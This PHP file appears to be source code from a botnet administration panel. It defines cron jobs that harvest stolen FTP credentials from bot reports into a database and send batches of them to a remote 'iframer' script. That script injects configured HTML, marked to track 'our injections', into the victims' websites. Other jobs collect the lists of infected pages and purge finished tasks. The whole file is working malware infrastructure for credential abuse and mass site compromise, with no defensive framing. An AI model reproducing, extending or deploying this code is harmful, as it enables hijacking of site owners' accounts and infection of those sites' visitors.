<?php
require_once 'system/lib/db.php';

/** CronJobs concerning files/
 */
class cronjobs_iframer implements ICronJobs {
	/** Grab new FTP accounts from the DB
	 * @cron period: 10m
	 */
	public function cronjob_new_accounts(){
		$ret = array('new_accs' => 0);

		$report_tables = list_reports_tables(true);
		list($max_yymmdd, $max_report_id) = mysql_fetch_row(mysql_q(
			'SELECT `table`, MAX(`report_id`) FROM `botnet_rep_iframer` GROUP BY `table` ORDER BY `table` DESC;'
			));

		foreach($report_tables as $yymmdd){
			if (!is_null($max_yymmdd) && $yymmdd < $max_yymmdd) continue; # don't mess with the past

			# Fetch new FTP accounts
			$q = '
				SELECT
					{i:yymmdd} AS `table`,
					`id` AS `report_id`,
					`context` AS `ftp_accs`
				FROM `botnet_reports_{=:yymmdd}`
				WHERE
					`id` > {i:id} AND
					( `type` = {i:type1} OR `type` = {i:type2} )
				';
			$q_data = array(
				'yymmdd' => $yymmdd,
				'id' => ($yymmdd === $max_yymmdd) ? $max_report_id : 0,
				'type1' => BLT_GRABBED_FTPSOFTWARE,
				'type2' => BLT_LOGIN_FTP,
				);
			$R = mysql_q($q=mkquery($q, $q_data));

			# Save them
			while ($R && !is_bool($r = mysql_fetch_assoc($R)))
				foreach (explode("\n", $r['ftp_accs']) as $ftp_acc)
					if (trim($r['ftp_acc'] = $ftp_acc)){
						$r['time'] = time();
						mysql_q(mkquery(
							'INSERT INTO `botnet_rep_iframer` (`table`, `report_id`, `found_at`, `ftp_acc`) VALUES ({i:table}, {i:report_id}, {i:time}, {s:ftp_acc})
							 ON DUPLICATE KEY UPDATE `table`={i:table}, `report_id`={i:report_id};',
							$r));
						if (mysql_affected_rows() == 1) # =1 insert, =2 update
							$ret['new_accs'] += 1;
						}
			}

		return $ret;
		}

	/** Post data to the iframer script & fetch the response
	 * @param $action
	 * @param array $data
	 * @return array
	 * @throws CronJobException
	 */
	protected function _iframer_request($action, array $args){
		# Prerequisites
		if (empty($GLOBALS['config']['iframer']['url']))
			throw new CronJobException('Iframer script URL is not set');

		# Data
		$iframer_post = array(
			'action' => $action,
			'args' => $args,
			'config' => $GLOBALS['config']['iframer'],
			);
		$marker_hash = md5(__FILE__);
		$iframer_post['config']['marker'] = substr($marker_hash,  0,10); # unique marker to find our injections

		$ctx = stream_context_create(array(
			'http' => array(
				'method'  => 'POST',
				'content' => http_build_query($iframer_post, '', '&'),
				'timeout' => 10,
				'header' => implode("\r\n", array(
					'Content-Type: application/x-www-form-urlencoded',
					))
			)));

		# Connect
		$f = fopen($GLOBALS['config']['iframer']['url'], 'r', false, $ctx);
		if (!$f){
			$e = error_get_last();
			throw new CronJobException('Iframer connection failed: '.$e['message']);
			}

		# Read the response prefix
		$ll = fread($f, 4); # the number of digits in the reponse length
		if (!is_numeric($ll) || strlen($ll) != 4){
			$got = $ll.fread($f, 1024);
			throw new CronJobException("Iframer protocol error (action=$action): [1] 4-bytes numeric prefix expected, got '$got'");
			}

		$bytes_expected = fread($f, $ll); # the response length
		if (!is_numeric($bytes_expected)){
			$got = $bytes_expected.$bytes_expected.fread($f, 1024);
			throw new CronJobException("Iframer protocol error (action=$action): [2] $bytes_expected-bytes numeric length expected, got '$got'");
			}

		# Read the response body
		$bytes_remaining = $bytes_expected;
		$response = '';
		while (!feof($f) && $bytes_remaining>0){
			$s = fread($f, $bytes_remaining);
			if ($s === FALSE)
				throw new CronJobException("Iframer protocol error (action=$action): fread() failed: expected_bytes=$bytes_expected, position=".strlen($response));
			$response .= $s;
			$bytes_remaining -= strlen($s);
			}

		if (strlen($response) != $bytes_expected)
			throw new CronJobException("Iframer protocol error (action=$action): fread() less bytes than expected: expected=$bytes_expected, got=".strlen($response));

		fclose($f);
		$response = unserialize($response);
		if ($response === FALSE)
			throw new CronJobException("Iframer protocol error (action=$action): unserialize() failed: error=".error_get_last());

		# Handle errors
		if (!empty($response['errors'])){
			$prefix = ($action == 'selftest')? 'Iframer remote installation error' : "Iframer remote '$action' error";
			$errors = htmlspecialchars(implode(' ; ', $response['errors']));  # untrusted source: no HTML here!
			throw new CronJobException("$prefix: $errors");
			}
		if (isset($response['errors']))
			unset($response['errors']);

		return $response;
		}

	/** Check the iframer state
	 * @throws CronJobException
	 */
	protected function _check_iframer(){
		$this->_iframer_request('selftest', array());
		}

	/** Check the iframer state, then give it new tasks
	 * @cron if: return !empty($GLOBALS['config']['iframer']['url']) && !empty($GLOBALS['config']['iframer']['html']) && $GLOBALS['config']['iframer']['mode'] != 'off';
	 * @cron period: 10m
	 * @cron weight: -5
	 */
	public function cronjob_iframer_launch(){
		# Collect tasks
		$update_accs = array();
		$iframer_args = array('accs' => array());
		$cfg = $GLOBALS['config']['iframer'];
		$R = mysql_q(mkquery(
				'SELECT `ftp_acc` FROM `botnet_rep_iframer`
				 WHERE `ignore`=0
				    AND ({i:delay_thr}=0 OR `found_at`<{i:delay_thr})
				    AND (
						   (`iframed_at` IS NULL AND (`posted_at` IS NULL OR `posted_at`<{i:posted_thr}))
						OR (`iframed_at` IS NOT NULL AND `iframed_at` < {i:reiframe_thr})
						)
				 LIMIT 10;',
				$qdata = array(
					'posted_thr' => time()-60*60*24, # re-post on no results
					'reiframe_thr' => empty($cfg['opt']['reiframe_days'])? 0 : time()-$cfg['opt']['reiframe_days']*60*60*24,
					'delay_thr' => empty($cfg['opt']['process_delay'])? 0 : (time()-$cfg['opt']['process_delay']*60*60),
				)));

		# Post tasks
		while ($R && !is_bool($r = mysql_fetch_assoc($R))){
			$iframer_args['accs'][] = $r['ftp_acc'];
			$update_accs[] = $r['ftp_acc'];
			}

		# Post tasks.
		$response = $this->_iframer_request('post_tasks', $iframer_args);

		# Update: posted_at
		if (!empty($update_accs) && empty($response['reject_reason']))
			mysql_q(mkquery(
					'UPDATE `botnet_rep_iframer` SET `posted_at`={i:time} WHERE `ftp_acc` IN({s,:accs});',
					array('time' => time(), 'accs' => $update_accs)
					));

		# Launch the script.
		# We launch it even if there're no new accounts: if the script has hit the limit - we relaunch it.
		$response = array_merge($response, $this->_iframer_request('launch', $iframer_args));

		return $response;
		}

	/** Collect reports from the iframer
	 * @cron if: return !empty($GLOBALS['config']['iframer']['url']);
	 * @cron period: 1m
	 * @cron weight: -11
	 */
	public function cronjob_iframer_collect(){
		$this->_check_iframer();

		# Request finished jobs
		$response = $this->_iframer_request('collect', array());
		$ret = array(
			'script_state' => $response['state'],
			'updated' => 0,
			'collected' => 0,
			);

		# Update table
		$collected_purge = array();
		foreach ($response['finished'] as $task_name => $task){
			$R = mysql_q(mkquery(
				'UPDATE `botnet_rep_iframer`
				 SET	`is_valid`={i:is_valid}, `iframed_at`={i:time},
						`s_page_count`={i:pagesN}, `s_pages`={s:pages},
						`s_stat`={s:stat}, `s_errors`={s:errors}
				 WHERE `ftp_acc`={s:ftp_acc};',
				array(
					'ftp_acc' => $task['ftp_acc'],
					'is_valid' => $task['is_valid'],
					'time' => time(),
					'pagesN' => count($task['pages']),
					'pages' => implode("\n", $task['pages']),
					'stat' => json_encode($task['stat']),
					'errors' => implode("\n", $task['errors']),
					)));

			if ($R){
				$ret['updated'] += mysql_affected_rows();
				$collected_purge[] = $task_name;
				}
			}

		# Purge on the script
		$ret['collected'] = count($collected_purge);
		if (!empty($collected_purge))
			$this->_iframer_request('collected_purge', array('task_names' => $collected_purge));

		return $ret;
		}
	}
